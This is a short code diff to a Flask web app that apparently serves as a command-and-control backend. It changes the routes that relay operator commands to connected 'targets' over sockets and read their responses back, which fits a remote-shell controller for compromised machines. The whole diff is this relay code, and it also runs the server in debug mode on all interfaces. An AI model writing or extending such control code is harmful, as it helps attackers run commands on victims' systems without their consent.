@@ -66,23 +66,19 @@ def register():
         print(f"Error during registration: {e}")
         return jsonify({"error": str(e)}), 500
 
-@app.route('/command/<target_ip>', methods=['POST'])
-def send_command(target_ip):
+@app.route('/command/<int:target_id>', methods=['POST'])
+def send_command(target_id):
     data = request.json
     command = comm_out(data['command'])
-    target = next((t for t in targets if t[0] == target_ip), None)
-    if not target:
-        return jsonify({"error": "Target not found"}), 404
-    # Send command to target
-    target[0].send(command)
+    target = targets[target_id][0]
+    target.send(command.encode('utf-8'))
     return jsonify({"message": "Command sent"})
 
-@app.route('/response/<target_ip>', methods=['POST'])
-def get_response(target_ip):
-    data = request.json
-    response = comm_in(data['response'])
-    # Process response from target
-    return jsonify({"message": "Response received", "response": response})
+@app.route('/response/<int:target_id>', methods=['GET'])
+def get_response(target_id):
+    target = targets[target_id][0]
+    response = comm_in(target.recv(4096).decode('utf-8'))
+    return jsonify({"response": response})
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
